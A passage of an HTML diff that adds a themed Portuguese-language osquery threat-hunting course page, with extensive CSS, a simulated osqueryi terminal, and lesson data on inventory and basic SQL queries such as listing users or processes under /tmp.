@@ -1,0 +1,1046 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>OSQUERY NA FLORESTA DA BE SAFE .INC</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700;800&family=Cinzel:wght@400;700;900&display=swap');
+*{box-sizing:border-box;margin:0;padding:0}
+:root{--blood:#8B0000;--blood2:#d43b3b;--forest:#1a3a1a;--gold:#c9a227;--gold2:#f0c040;--parch:#f5e6c8;--green0:#061608;--green1:#0b2a12;--green2:#102f16;--green3:#143d1d;--term:#081008;--term2:#0e1d0e;--ok:#39ff14;--bad:#ff5555}
+html,body{min-height:100%;font-family:'JetBrains Mono',monospace;background:var(--forest);color:var(--parch);scroll-behavior:smooth}
+body{overflow-x:hidden}.app{min-height:100vh;position:relative;overflow-x:hidden;background:radial-gradient(circle at 72% 8%,rgba(240,192,64,.14),transparent 12%),linear-gradient(180deg,#143414 0%,#071407 100%)}
+.forest-bg,.stars{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}.fog-layer{position:fixed;left:0;right:0;bottom:0;height:150px;background:linear-gradient(to top,rgba(6,18,8,.94),transparent);z-index:1;pointer-events:none}.moon{position:fixed;top:38px;right:7vw;width:70px;height:70px;border-radius:50%;background:radial-gradient(circle at 35% 35%,#fff4d7,#c9a227 65%);box-shadow:0 0 60px rgba(240,192,64,.45);z-index:1}.tree{position:absolute;bottom:0;background:#071307;transform-origin:bottom center}.star{position:absolute;background:#fff;border-radius:50%;animation:twinkle var(--d) ease-in-out infinite}@keyframes twinkle{0%,100%{opacity:.18}50%{opacity:1}}
+.content{position:relative;z-index:5;max-width:1180px;margin:0 auto;padding:26px 18px 70px}.header{text-align:center;padding:22px 0 26px}.header-badge{display:inline-block;background:#0b2a12;border:1px solid rgba(240,192,64,.42);color:var(--gold2);font-size:11px;letter-spacing:3px;text-transform:uppercase;padding:8px 20px;border-radius:999px;margin-bottom:16px;box-shadow:0 12px 30px rgba(0,0,0,.35)}h1{font-family:'Cinzel',serif;font-size:clamp(28px,5vw,54px);line-height:1.05;color:var(--gold2);text-shadow:0 0 30px rgba(201,162,39,.5)}h1 span{color:#ff5555}.header-sub{margin-top:12px;font-size:12px;color:rgba(245,230,200,.78);letter-spacing:1.6px}.grid4{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin:24px 0}.char-card,.stat-box,.module-card,.panel,.quote-box,.nav-tabs,.cert-panel,.quickbar button,.mini-btn,.choice,.lesson-btn,.terminal-wrap,.student-gate,.siem-card{background:#0b2a12!important;background-color:#0b2a12!important;opacity:1!important;border:1px solid rgba(240,192,64,.38);box-shadow:0 14px 34px rgba(0,0,0,.36);border-radius:12px}.char-card{background:#102f16!important;padding:15px;display:flex;align-items:center;gap:10px}.char-emoji{font-size:30px}.char-name{display:block;color:var(--gold2);font-weight:800;font-size:12px}.char-role{display:block;color:rgba(245,230,200,.62);font-size:10px;margin-top:3px}.stat-box{padding:15px;text-align:center}.stat-num{display:block;font-family:'Cinzel',serif;font-size:30px;color:var(--gold2)}.stat-label{display:block;margin-top:5px;font-size:10px;color:rgba(245,230,200,.6);letter-spacing:1px;text-transform:uppercase}.student-gate{margin:20px 0;padding:18px;display:grid;grid-template-columns:1.2fr 1fr auto;gap:12px;align-items:center}.student-gate label{color:var(--gold2);font-size:13px;font-weight:800}.student-gate input,.terminal-input-row input{width:100%;background:#061608;color:var(--parch);border:1px solid rgba(240,192,64,.42);border-radius:10px;padding:14px;font-family:'JetBrains Mono',monospace;font-size:13px;outline:none}.student-gate input:focus,.terminal-input-row input:focus{border-color:var(--gold2);box-shadow:0 0 0 3px rgba(240,192,64,.16)}.section-title{font-family:'Cinzel',serif;color:var(--gold2);font-size:17px;text-transform:uppercase;letter-spacing:2px;margin:28px 0 14px;display:flex;gap:12px;align-items:center}.section-title:after{content:'';height:1px;flex:1;background:linear-gradient(to right,rgba(240,192,64,.5),transparent)}.nav-tabs{display:flex;gap:6px;padding:6px;margin:20px 0}.nav-tab{flex:1;padding:12px;border:1px solid transparent;background:#081f0d;color:rgba(245,230,200,.72);border-radius:9px;text-transform:uppercase;letter-spacing:1px;font-size:11px;font-weight:800;cursor:pointer}.nav-tab.active,.nav-tab:hover{background:#143d1d;color:var(--gold2);border-color:rgba(240,192,64,.42)}.tab-content{display:none}.tab-content.active{display:block}.modules-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(265px,1fr));gap:12px}.module-card{position:relative;padding:18px;min-height:160px;cursor:pointer;transition:.22s}.module-card:hover{transform:translateY(-3px);background:#143d1d!important}.module-card.locked{background:#081f0d!important;filter:saturate(.75)}.module-card.done{background:#0f3a18!important}.module-num{font-size:10px;color:#ff7777;letter-spacing:2px}.module-title{display:block;margin:8px 0;color:var(--gold2);font-weight:800;font-size:15px}.module-desc{font-size:12px;line-height:1.55;color:rgba(245,230,200,.78)}.module-meta{margin-top:12px;display:flex;justify-content:space-between;gap:8px;font-size:10px;color:rgba(245,230,200,.62)}.lock{position:absolute;right:14px;top:12px;opacity:.7}.howl-btn,.mini-btn{border:1px solid rgba(240,192,64,.5);background:linear-gradient(135deg,#6c0909,#0b2a12);color:var(--gold2);font-family:'Cinzel',serif;font-weight:900;letter-spacing:1.5px;padding:13px 16px;border-radius:10px;cursor:pointer;text-transform:uppercase}.howl-btn:hover,.mini-btn:hover{filter:brightness(1.18);transform:translateY(-1px)}.mini-btn{font-size:11px;padding:10px 12px;background:#0b2a12}.quote-box{padding:16px;border-left:4px solid var(--blood2);margin:16px 0}.quote-text{font-size:13px;line-height:1.7;color:rgba(245,230,200,.87);font-style:italic}.quote-attr{font-size:11px;color:var(--gold);margin-top:8px}.lesson-layout{display:grid;grid-template-columns:260px 1fr;gap:16px}.lesson-nav{display:flex;flex-direction:column;gap:8px}.lesson-btn{text-align:left;padding:12px;border-radius:10px;border:1px solid rgba(240,192,64,.32);color:rgba(245,230,200,.75);cursor:pointer}.lesson-btn.active{background:#143d1d!important;color:var(--gold2)}.lesson-btn.locked{opacity:.72}.panel{padding:20px}.panel h2,.panel h3{font-family:'Cinzel',serif;color:var(--gold2);margin-bottom:10px}.panel p,.panel li{font-size:13px;line-height:1.75;color:rgba(245,230,200,.86)}.two{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin:14px 0}.callout{padding:14px;border-left:4px solid var(--gold);line-height:1.65}.code-block{background:#061608;border:1px solid rgba(57,255,20,.25);border-radius:10px;color:#9dff8f;padding:12px;margin:10px 0;white-space:pre-wrap;overflow:auto;font-size:12px}.terminal-wrap{overflow:hidden}.terminal-bar{background:#061608;padding:10px 14px;border-bottom:1px solid rgba(57,255,20,.2);display:flex;align-items:center;gap:8px}.t-dot{width:10px;height:10px;border-radius:50%}.red{background:#ff5f57}.yellow{background:#ffbd2e}.green{background:#28ca41}.terminal-title{margin-left:8px;font-size:11px;color:rgba(57,255,20,.7)}.terminal-body{background:#081008;color:rgba(57,255,20,.82);min-height:320px;max-height:430px;overflow:auto;padding:16px;font-size:12px;line-height:1.65}.terminal-input-row{display:flex;gap:8px;padding:12px;background:#061608}.t-prompt{color:rgba(57,255,20,.55)}.t-cmd{color:#39ff14}.t-out{color:#b6ffb1}.t-header{color:var(--gold2)}.t-bad{color:#ff7777}.t-good{color:#69ff69}.quickbar{display:flex;flex-wrap:wrap;gap:8px;margin:14px 0}.quickbar button{color:var(--gold2);padding:10px 12px;border-radius:10px;cursor:pointer}.quiz-box{margin-top:16px}.choice{display:block;width:100%;text-align:left;color:rgba(245,230,200,.86);padding:13px;margin:8px 0;cursor:pointer}.choice.correct{border-color:#39ff14!important;background:#0f3a18!important}.choice.wrong{border-color:#ff5555!important;background:#3b1010!important}.progress-bar-bg{height:12px;background:#061608;border:1px solid rgba(240,192,64,.25);border-radius:99px;overflow:hidden}.progress-bar-fill{height:100%;background:linear-gradient(90deg,var(--blood2),var(--gold2));width:0%}.cert-panel{text-align:center;padding:20px}.cert-panel canvas{width:100%;max-width:900px;border-radius:12px;border:1px solid rgba(240,192,64,.42);background:#0b2a12}.toast{position:fixed;left:50%;bottom:24px;transform:translateX(-50%);z-index:20;background:#3b1010;color:#fff1d4;border:1px solid rgba(240,192,64,.4);padding:13px 16px;border-radius:10px;box-shadow:0 20px 60px rgba(0,0,0,.6);display:none;max-width:min(700px,92vw);font-size:13px}.toast.show{display:block}.small{font-size:11px;color:rgba(245,230,200,.62);line-height:1.6}.wolf-howl-zone{position:fixed;right:20px;bottom:20px;z-index:15}.wolf-btn{width:56px;height:56px;border-radius:50%;border:2px solid var(--blood2);background:#3b1010;color:#fff;font-size:24px;cursor:pointer;box-shadow:0 0 25px rgba(139,0,0,.55)}
+@media(max-width:900px){.grid4,.two,.lesson-layout,.student-gate{grid-template-columns:1fr}.nav-tabs{flex-wrap:wrap}.nav-tab{min-width:44%}.terminal-input-row{flex-direction:column}}
+
+/* === PATCH: terminal fixo em todas as páginas === */
+.content{padding-right:460px !important;}
+#tab-terminal{
+  display:block !important;
+  position:fixed !important;
+  right:16px !important;
+  bottom:16px !important;
+  width:430px !important;
+  max-height:72vh !important;
+  z-index:80 !important;
+  padding:0 !important;
+}
+#tab-terminal .section-title{margin:0 0 8px 0 !important;font-size:12px !important;}
+#tab-terminal .terminal-wrap{box-shadow:0 18px 60px rgba(0,0,0,.58) !important;}
+#termBody{max-height:260px !important;overflow:auto !important;}
+#tab-terminal .quote-box{display:none !important;}
+#tab-terminal .quickbar{display:grid !important;grid-template-columns:1fr 1fr !important;gap:6px !important;margin-top:8px !important;}
+#tab-terminal .quickbar button{font-size:9px !important;padding:8px !important;min-height:auto !important;}
+.choice{
+  min-height:72px !important;
+  display:flex !important;
+  align-items:center !important;
+  line-height:1.45 !important;
+}
+.quiz-locked{
+  border:1px solid rgba(255,68,68,.45);
+  background:#2a0b0b !important;
+  color:#ffd0d0;
+  padding:10px 12px;
+  border-radius:10px;
+  margin:10px 0;
+  font-size:12px;
+  line-height:1.55;
+}
+.lab-status{
+  margin:10px 0;
+  padding:10px 12px;
+  border-radius:10px;
+  border:1px solid rgba(240,192,64,.42);
+  background:#102f16 !important;
+  color:rgba(245,230,200,.86);
+  font-size:12px;
+}
+@media(max-width:1050px){
+  .content{padding-right:18px !important;padding-bottom:560px !important;}
+  #tab-terminal{left:10px !important;right:10px !important;bottom:10px !important;width:auto !important;max-height:48vh !important;}
+  #termBody{max-height:170px !important;}
+}
+
+
+/* === PATCH: terminal fixo com scroll funcional e sem suprimir queries === */
+#tab-terminal{
+  display:flex !important;
+  flex-direction:column !important;
+  height:78vh !important;
+  max-height:78vh !important;
+  overflow:hidden !important;
+}
+
+#tab-terminal .terminal-wrap{
+  display:flex !important;
+  flex-direction:column !important;
+  min-height:0 !important;
+  flex:1 1 auto !important;
+  overflow:hidden !important;
+}
+
+#tab-terminal .terminal-body,
+#termBody{
+  flex:1 1 auto !important;
+  min-height:220px !important;
+  max-height:none !important;
+  height:auto !important;
+  overflow-y:auto !important;
+  overflow-x:auto !important;
+  overscroll-behavior:contain !important;
+  scrollbar-width:thin !important;
+  white-space:pre-wrap !important;
+  word-break:break-word !important;
+}
+
+#tab-terminal .terminal-input-row{
+  flex:0 0 auto !important;
+  position:sticky !important;
+  bottom:0 !important;
+  z-index:3 !important;
+  background:#071508 !important;
+}
+
+#tab-terminal .quickbar{
+  flex:0 0 auto !important;
+  max-height:116px !important;
+  overflow-y:auto !important;
+  overflow-x:hidden !important;
+}
+
+#tab-terminal .section-title{
+  flex:0 0 auto !important;
+}
+
+@media(max-width:1050px){
+  #tab-terminal{
+    height:52vh !important;
+    max-height:52vh !important;
+  }
+  #termBody{
+    min-height:150px !important;
+  }
+  #tab-terminal .quickbar{
+    max-height:82px !important;
+  }
+}
+
+
+/* === PATCH MOBILE RESPONSIVO BE SAFE === */
+html, body {
+  width:100%;
+  max-width:100%;
+  overflow-x:hidden !important;
+}
+
+* {
+  max-width:100%;
+}
+
+img, canvas, svg {
+  max-width:100%;
+  height:auto;
+}
+
+.content {
+  width:100% !important;
+}
+
+input, button, textarea, select {
+  font-size:16px;
+}
+
+.terminal-input-row {
+  display:flex;
+  gap:8px;
+}
+
+.terminal-input-row input {
+  min-width:0;
+  flex:1 1 auto;
+}
+
+.terminal-input-row button {
+  flex:0 0 auto;
+}
+
+@media (max-width: 900px) {
+  .content {
+    padding:14px 12px 58vh !important;
+    margin:0 !important;
+    max-width:100% !important;
+  }
+
+  .header {
+    padding-top:14px !important;
+  }
+
+  h1 {
+    font-size:clamp(25px, 8vw, 38px) !important;
+    line-height:1.08 !important;
+  }
+
+  .header-sub {
+    font-size:11px !important;
+    line-height:1.5 !important;
+  }
+
+  .grid4,
+  .two,
+  .lesson-layout,
+  .dashboard-grid,
+  .modules-grid {
+    display:grid !important;
+    grid-template-columns:1fr !important;
+    gap:10px !important;
+  }
+
+  .char-card,
+  .stat-box,
+  .module-card,
+  .panel,
+  .quote-box,
+  .student-gate,
+  .cert-panel {
+    width:100% !important;
+    min-width:0 !important;
+  }
+
+  .nav-tabs {
+    display:grid !important;
+    grid-template-columns:repeat(2, minmax(0, 1fr)) !important;
+    gap:8px !important;
+    padding:8px !important;
+  }
+
+  .nav-tab {
+    width:100% !important;
+    min-width:0 !important;
+    white-space:normal !important;
+    line-height:1.25 !important;
+    padding:10px 8px !important;
+  }
+
+  .student-gate {
+    display:grid !important;
+    grid-template-columns:1fr !important;
+    gap:10px !important;
+  }
+
+  #studentName,
+  #saveNameBtn,
+  #startBtn {
+    width:100% !important;
+  }
+
+  .lesson-nav {
+    display:grid !important;
+    grid-template-columns:1fr 1fr !important;
+    gap:8px !important;
+    max-height:none !important;
+    overflow:visible !important;
+  }
+
+  .lesson-btn {
+    min-width:0 !important;
+    white-space:normal !important;
+    text-align:left !important;
+    padding:10px !important;
+  }
+
+  .code-block {
+    overflow-x:auto !important;
+    white-space:pre-wrap !important;
+    word-break:break-word !important;
+    font-size:11px !important;
+  }
+
+  .choice {
+    min-height:auto !important;
+    padding:12px !important;
+    font-size:12px !important;
+  }
+
+  #tab-terminal {
+    left:8px !important;
+    right:8px !important;
+    bottom:8px !important;
+    width:auto !important;
+    height:52vh !important;
+    max-height:52vh !important;
+    border-radius:14px !important;
+  }
+
+  #tab-terminal .section-title {
+    font-size:10px !important;
+    margin-bottom:6px !important;
+  }
+
+  #tab-terminal .terminal-wrap {
+    border-radius:12px !important;
+  }
+
+  #termBody {
+    min-height:110px !important;
+    font-size:10px !important;
+    line-height:1.55 !important;
+  }
+
+  .terminal-bar {
+    padding:7px 10px !important;
+  }
+
+  .terminal-title {
+    font-size:9px !important;
+    white-space:nowrap !important;
+    overflow:hidden !important;
+    text-overflow:ellipsis !important;
+  }
+
+  .terminal-input-row {
+    display:grid !important;
+    grid-template-columns:1fr auto !important;
+    gap:6px !important;
+    padding:8px !important;
+  }
+
+  #terminalInput {
+    width:100% !important;
+    min-width:0 !important;
+    font-size:12px !important;
+    padding:10px !important;
+  }
+
+  #terminalRunBtn {
+    width:auto !important;
+    min-width:86px !important;
+    padding:10px 8px !important;
+    font-size:11px !important;
+  }
+
+  #tab-terminal .quickbar {
+    grid-template-columns:1fr 1fr !important;
+    max-height:78px !important;
+    overflow-y:auto !important;
+    gap:6px !important;
+  }
+
+  #tab-terminal .quickbar button {
+    font-size:8.5px !important;
+    padding:7px 5px !important;
+    line-height:1.25 !important;
+  }
+
+  .moon {
+    width:42px !important;
+    height:42px !important;
+    top:18px !important;
+    right:18px !important;
+  }
+
+  .wolf-howl-zone {
+    bottom:calc(52vh + 18px) !important;
+    right:12px !important;
+  }
+
+  .wolf-btn {
+    width:46px !important;
+    height:46px !important;
+  }
+
+  #certCanvas {
+    width:100% !important;
+    height:auto !important;
+  }
+}
+
+@media (max-width: 520px) {
+  .content {
+    padding:10px 10px 61vh !important;
+  }
+
+  .characters-bar,
+  .grid4 {
+    display:grid !important;
+    grid-template-columns:1fr !important;
+  }
+
+  .nav-tabs {
+    grid-template-columns:1fr !important;
+  }
+
+  .lesson-nav {
+    grid-template-columns:1fr !important;
+  }
+
+  .module-card {
+    min-height:auto !important;
+    padding:14px !important;
+  }
+
+  .module-title {
+    font-size:13px !important;
+  }
+
+  .module-desc,
+  p,
+  .small,
+  .quote-text {
+    font-size:11px !important;
+    line-height:1.55 !important;
+  }
+
+  .section-title {
+    font-size:12px !important;
+    letter-spacing:1px !important;
+  }
+
+  #tab-terminal {
+    height:56vh !important;
+    max-height:56vh !important;
+  }
+
+  #termBody {
+    min-height:100px !important;
+    font-size:9.5px !important;
+  }
+
+  .terminal-input-row {
+    grid-template-columns:1fr !important;
+  }
+
+  #terminalRunBtn {
+    width:100% !important;
+  }
+
+  #tab-terminal .quickbar {
+    grid-template-columns:1fr !important;
+    max-height:82px !important;
+  }
+
+  .wolf-howl-zone {
+    bottom:calc(56vh + 16px) !important;
+  }
+}
+
+
+.progressive-box{
+  margin-top:14px;
+}
+.progressive-box h3{
+  color:#c9a227;
+  font-size:13px;
+  letter-spacing:1px;
+}
+
+
+/* === PATCH RESPONSIVO REAL: terminal sem esmagar conteúdo === */
+
+/* Desktop largo: curso + terminal convivem */
+@media (min-width: 1181px){
+  .content{
+    max-width: calc(100vw - 500px) !important;
+    margin-left: 24px !important;
+    margin-right: 480px !important;
+    padding-right: 18px !important;
+  }
+
+  #tab-terminal{
+    width: 440px !important;
+    right: 20px !important;
+    bottom: 20px !important;
+    height: 76vh !important;
+    max-height: 76vh !important;
+  }
+
+  #termBody{
+    min-height: 260px !important;
+  }
+}
+
+/* Tablet e notebook menor: terminal deixa de ficar lateral e vira dock inferior */
+@media (max-width: 1180px){
+  .content{
+    max-width: 100% !important;
+    margin: 0 auto !important;
+    padding-left: 14px !important;
+    padding-right: 14px !important;
+    padding-bottom: 44vh !important;
+  }
+
+  #tab-terminal{
+    left: 14px !important;
+    right: 14px !important;
+    bottom: 12px !important;
+    width: auto !important;
+    height: 38vh !important;
+    max-height: 38vh !important;
+    display: flex !important;
+    flex-direction: column !important;
+    border-radius: 16px !important;
+  }
+
+  #termBody{
+    min-height: 120px !important;
+    max-height: none !important;
+    overflow-y: auto !important;
+  }
+
+  #tab-terminal .quickbar{
+    grid-template-columns: repeat(3, minmax(0, 1fr)) !important;
+    max-height: 76px !important;
+    overflow-y: auto !important;
+  }
+
+  .lesson-layout,
+  .two{
+    grid-template-columns: 1fr !important;
+  }
+}
+
+/* Mobile: terminal compacto e conteúdo legível */
+@media (max-width: 700px){
+  .content{
+    padding: 10px 10px 40vh !important;
+  }
+
+  .grid4,
+  .characters-bar,
+  .modules-grid,
+  .dashboard-grid{
+    display: grid !important;
+    grid-template-columns: 1fr !important;
+    gap: 10px !important;
+  }
+
+  .nav-tabs{
+    display: grid !important;
+    grid-template-columns: 1fr 1fr !important;
+    gap: 8px !important;
+  }
+
+  .nav-tab{
+    padding: 10px 6px !important;
+    font-size: 10px !important;
+    white-space: normal !important;
+  }
+
+  .lesson-nav{
+    display: grid !important;
+    grid-template-columns: 1fr !important;
+    gap: 8px !important;
+  }
+
+  #tab-terminal{
+    left: 8px !important;
+    right: 8px !important;
+    bottom: 8px !important;
+    height: 34vh !important;
+    max-height: 34vh !important;
+    min-height: 265px !important;
+    border-radius: 14px !important;
+  }
+
+  #tab-terminal .section-title{
+    font-size: 10px !important;
+    margin: 0 0 5px 0 !important;
+    line-height: 1.2 !important;
+  }
+
+  #tab-terminal .terminal-wrap{
+    min-height: 0 !important;
+  }
+
+  #termBody{
+    min-height: 90px !important;
+    font-size: 9.5px !important;
+    line-height: 1.45 !important;
+  }
+
+  .terminal-input-row{
+    display: grid !important;
+    grid-template-columns: 1fr !important;
+    gap: 6px !important;
+  }
+
+  #terminalInput{
+    width: 100% !important;
+    min-width: 0 !important;
+    font-size: 12px !important;
+    padding: 9px !important;
+  }
+
+  #terminalRunBtn{
+    width: 100% !important;
+    padding: 9px !important;
+    font-size: 11px !important;
+  }
+
+  #tab-terminal .quickbar{
+    grid-template-columns: 1fr 1fr !important;
+    max-height: 58px !important;
+  }
+
+  #tab-terminal .quickbar button{
+    font-size: 8px !important;
+    padding: 6px 4px !important;
+    line-height: 1.2 !important;
+  }
+
+  h1{
+    font-size: clamp(24px, 8vw, 34px) !important;
+  }
+
+  .module-card,
+  .panel,
+  .cert-panel,
+  .quote-box,
+  .student-gate{
+    padding: 14px !important;
+  }
+
+  .choice{
+    min-height: auto !important;
+    padding: 11px !important;
+    font-size: 11px !important;
+  }
+
+  .wolf-howl-zone{
+    bottom: calc(34vh + 18px) !important;
+  }
+}
+
+/* Mobile muito pequeno: evita terminal cobrir tudo */
+@media (max-width: 420px){
+  .content{
+    padding-bottom: 42vh !important;
+  }
+
+  #tab-terminal{
+    height: 36vh !important;
+    min-height: 245px !important;
+  }
+
+  #termBody{
+    min-height: 72px !important;
+  }
+
+  #tab-terminal .quickbar{
+    display: none !important;
+  }
+
+  .wolf-howl-zone{
+    bottom: calc(36vh + 16px) !important;
+  }
+}
+
+
+#tab-terminal.terminal-collapsed{
+  height: 44px !important;
+  min-height: 44px !important;
+  overflow: hidden !important;
+}
+#tab-terminal.terminal-collapsed .terminal-wrap,
+#tab-terminal.terminal-collapsed .quickbar{
+  display:none !important;
+}
+
+
+/* === PATCH DIDÁTICO: modo professor para comandos === */
+.teacher-card{
+  background:#0b2a12 !important;
+  border:1px solid rgba(240,192,64,.42);
+  border-radius:14px;
+  padding:14px;
+  margin:12px 0;
+  box-shadow:0 12px 30px rgba(0,0,0,.32);
+}
+.teacher-card h4{
+  margin:0 0 8px 0;
+  color:#f0c040;
+  font-size:13px;
+  letter-spacing:1px;
+}
+.teacher-card p,
+.teacher-card li{
+  font-size:12px;
+  line-height:1.65;
+  color:rgba(245,230,200,.86);
+}
+.teacher-card ul{
+  margin:8px 0 0 18px;
+}
+.teacher-grid{
+  display:grid;
+  grid-template-columns:1fr 1fr;
+  gap:10px;
+  margin-top:10px;
+}
+.teacher-pill{
+  background:#081f0d !important;
+  border:1px solid rgba(240,192,64,.28);
+  border-radius:12px;
+  padding:10px;
+}
+.teacher-pill strong{
+  color:#f0c040;
+}
+.term-teacher{
+  margin-top:8px;
+  padding:10px 12px;
+  border-left:3px solid #c9a227;
+  background:#081f0d !important;
+  color:rgba(245,230,200,.88);
+  border-radius:8px;
+  font-size:11px;
+  line-height:1.55;
+}
+.term-teacher b{
+  color:#f0c040;
+}
+@media(max-width:700px){
+  .teacher-grid{grid-template-columns:1fr;}
+  .teacher-card p,.teacher-card li{font-size:11px;}
+}
+
+</style>
+</head>
+<body>
+<div class="app"><div class="forest-bg" id="forestBg"></div><div class="fog-layer"></div><div class="moon"></div><div class="stars" id="starsEl"></div><div class="content">
+<header class="header"><div class="header-badge">🔴 Be Safe .Inc — Floresta Digital</div><h1>OSQUERY NA <span>FLORESTA</span><br>DA BE SAFE .INC</h1><div class="header-sub">Do zero ao hunting avançado · teoria técnica · SQL · endpoint telemetry · prática realista</div><div class="grid4"><div class="char-card"><span class="char-emoji">🐺</span><div><span class="char-name">Lobo Mau</span><span class="char-role">Ameaça persistente com péssimos hábitos</span></div></div><div class="char-card"><span class="char-emoji">🔴</span><div><span class="char-name">Chapeuzinho</span><span class="char-role">Analista SOC em evolução</span></div></div><div class="char-card"><span class="char-emoji">🏹</span><div><span class="char-name">Caçador</span><span class="char-role">Incident Responder sem paciência</span></div></div><div class="char-card"><span class="char-emoji">🏠</span><div><span class="char-name">Vovó-SRV-2009</span><span class="char-role">Servidor legado que merece terapia</span></div></div></div><div class="grid4"><div class="stat-box"><span class="stat-num">12</span><span class="stat-label">Módulos</span></div><div class="stat-box"><span class="stat-num">12h</span><span class="stat-label">Carga horária</span></div><div class="stat-box"><span class="stat-num">70%</span><span class="stat-label">Certificado</span></div><div class="stat-box"><span class="stat-num">100%</span><span class="stat-label">Mão na massa</span></div></div></header>
+<section class="student-gate"><div><label for="studentName">Nome obrigatório para iniciar e emitir certificado</label><div class="small">Sem nome, sem aula. Até malware deixa rastro… aluno anônimo não passa na auditoria.</div></div><input id="studentName" placeholder="Digite seu nome completo" autocomplete="name"><button class="howl-btn" id="saveNameBtn">Registrar</button></section>
+<nav class="nav-tabs"><button class="nav-tab active" data-tab="curso">🌲 Curso</button><button class="nav-tab" data-tab="aula">📚 Aula</button><button class="nav-tab" data-tab="terminal">💻 Terminal</button><button class="nav-tab" data-tab="progresso">📊 Progresso</button><button class="nav-tab" data-tab="certificado">🏅 Certificado</button></nav>
+<section id="tab-curso" class="tab-content active"><div class="section-title">Trilha de aprendizado</div><div class="modules-grid" id="modulesGrid"></div><div style="margin-top:18px"><button class="howl-btn" id="startBtn">🐺 iniciar caçada — módulo atual</button></div><div class="quote-box"><div class="quote-text">Query sem hipótese é só SQL fazendo cosplay de investigação. Aqui você aprende o comando, mas também aprende por que ele existe.</div><div class="quote-attr">— Caçador da Be Safe .Inc</div></div></section>
+<section id="tab-aula" class="tab-content"><div class="section-title">Sala de aula operacional</div><div class="lesson-layout"><div class="lesson-nav" id="lessonNav"></div><div class="panel" id="lessonPanel"></div></div></section>
+<section id="tab-terminal" class="tab-content"><div class="section-title">Terminal osqueryi — Be Safe .Inc <button id="terminalToggleBtn" type="button" style="float:right;background:#0b2a12;color:#f0c040;border:1px solid rgba(240,192,64,.45);border-radius:8px;padding:3px 8px;font-size:10px">recolher</button></div><div class="terminal-wrap"><div class="terminal-bar"><span class="t-dot red"></span><span class="t-dot yellow"></span><span class="t-dot green"></span><span class="terminal-title">osqueryi — HOST: VOVO-SRV-2009 — FOREST MODE</span></div><div class="terminal-body" id="termBody"></div><div class="terminal-input-row"><input id="terminalInput" placeholder="Digite uma query... ex: SELECT pid,name,path FROM processes WHERE path LIKE '/tmp/%';"><button class="howl-btn" id="terminalRunBtn" type="button">Executar</button></div></div><div class="quickbar" id="quickbar"></div><div class="quote-box"><div class="quote-text">O terminal aceita SELECT, WHERE, LIKE, LIMIT, .tables, .schema, help e clear. Não é decoração… decoração é dashboard sem hipótese.</div><div class="quote-attr">— Be Safe .Inc SOC Lab</div></div></section>
+<section id="tab-progresso" class="tab-content"><div class="section-title">Progresso na floresta</div><div class="grid4"><div class="stat-box"><span class="stat-num" id="doneCount">0/12</span><span class="stat-label">Módulos</span></div><div class="stat-box"><span class="stat-num" id="scoreBox">0%</span><span class="stat-label">Score</span></div><div class="stat-box"><span class="stat-num" id="labsBox">0</span><span class="stat-label">Labs</span></div><div class="stat-box"><span class="stat-num" id="certStatus">🔒</span><span class="stat-label">Certificado</span></div></div><div class="panel"><div class="progress-bar-bg"><div class="progress-bar-fill" id="progressFill"></div></div><p class="small" id="progressText" style="margin-top:10px">0% concluído</p></div><div class="modules-grid" id="progressModules"></div></section>
+<section id="tab-certificado" class="tab-content"><div class="section-title">Certificado</div><div class="cert-panel"><p class="small" id="certNote">Complete pelo menos 70% dos módulos e registre seu nome.</p><canvas id="certCanvas" width="1400" height="900"></canvas><div style="margin-top:14px;display:flex;gap:10px;justify-content:center;flex-wrap:wrap"><button class="howl-btn" id="genCertBtn">Gerar certificado</button><button class="howl-btn" id="downloadCertBtn">Baixar PNG</button></div></div></section>
+</div></div><div class="wolf-howl-zone"><button class="wolf-btn" id="wolfBtn">🐺</button></div><div class="toast" id="toast"></div>
+<script>
+'use strict';
+const $=s=>document.querySelector(s);const $$=s=>Array.from(document.querySelectorAll(s));
+const lessons=[{"id": 1, "acid":"A Chapeuzinho acabou de descobrir que inventário não é caça. O estagiário do SOC já queria abrir incidente porque viu hostname estranho... era a impressora da diretoria.","t": "O que é osquery?", "tag": "Fundamentos", "desc": "Endpoint telemetry com SQL, sem vender milagre nem fingir que dashboard caça sozinho.", "theory": ["osquery transforma partes do sistema operacional em tabelas consultáveis. Processos, usuários, portas, pacotes e configurações viram dados interrogáveis com SQL.", "O osqueryi é o modo interativo para estudo e investigação pontual. O osqueryd é o daemon usado para execução programada, logging e operação contínua.", "Na Be Safe .Inc, o primeiro passo é aprender a perguntar ao endpoint antes de sair acusando o lobo pelo PowerPoint."], "practice": "Execute o lab e observe hostname, CPU e memória. A pergunta do quiz depende desse resultado.", "cmds": [".tables", ".schema system_info", "SELECT hostname,cpu_brand,physical_memory FROM system_info;"], "lab": "SELECT hostname,cpu_brand,physical_memory FROM system_info;", "quiz": "Após executar o lab, qual leitura é mais correta?", "choices": ["O host vovo-srv-2009 expôs inventário básico útil para contexto inicial.", "O host vovo-srv-2009 mostrou contexto, mas ainda sem prova de invasão.", "O host vovo-srv-2009 trouxe dados para orientar próximas consultas.", "O host vovo-srv-2009 respondeu telemetria, não uma conclusão final."], "a": 1, "fb": ["O inventário é útil, mas afirmar só isso ignora a cautela investigativa necessária.", "Exatamente. O resultado dá contexto do ativo, mas não prova compromisso sozinho.", "Está correto, porém menos preciso: orientar próximas consultas não fecha a interpretação.", "Está correto, mas faltou explicar que inventário não equivale a evidência de incidente."]}, {"id": 2, "acid":"SQL sem WHERE é igual analista sem hipótese: até produz volume, mas ninguém sabe por que aquilo está ocupando espaço.","t": "SQL do zero sem choro", "tag": "SELECT/WHERE", "desc": "SELECT, FROM, WHERE, LIKE, LIMIT e ORDER BY aplicados ao endpoint realista.", "theory": ["SELECT define colunas, FROM define tabela e WHERE reduz ruído. Sem filtro, você despeja dado; com filtro, você investiga.", "LIKE ajuda a localizar padrões em strings, como caminhos temporários, comandos suspeitos e nomes fora do baseline.", "LIMIT evita transformar uma aula em enchente de tabela. O objetivo é raciocinar, não afogar o analista."], "practice": "Execute a query de usuários e compare contas humanas, técnicas e privilegiadas.", "cmds": ["SELECT username,uid,directory FROM users;", "SELECT 